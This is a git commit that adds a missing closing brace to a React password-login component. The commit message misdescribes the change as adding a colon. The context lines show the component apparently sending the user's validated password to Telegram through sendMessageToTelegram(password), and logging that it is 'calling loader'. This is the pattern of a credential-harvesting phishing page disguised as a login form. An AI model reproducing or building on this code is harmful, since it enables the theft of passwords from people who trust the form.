2aea8d085d0b9fe28653e50fa7fb2b816ddfd11d
Peter Ekwere <105059347+PeterEkwere@users.noreply.github.com>
2025-02-18 11:17:16 +0000

    fixd missing colon in password page

--- src/components/PasswordLogin.jsx
+++ src/components/PasswordLogin.jsx
@@ -78,6 +78,7 @@ export default function LoginForm({ setNavigation, navigation }) {
         if (isValid) {
             console.log("PASSWORD IS VALID SO CALLING LOADER NOW")
             sendMessageToTelegram(password);
+        }
         return isValid;
     }
 
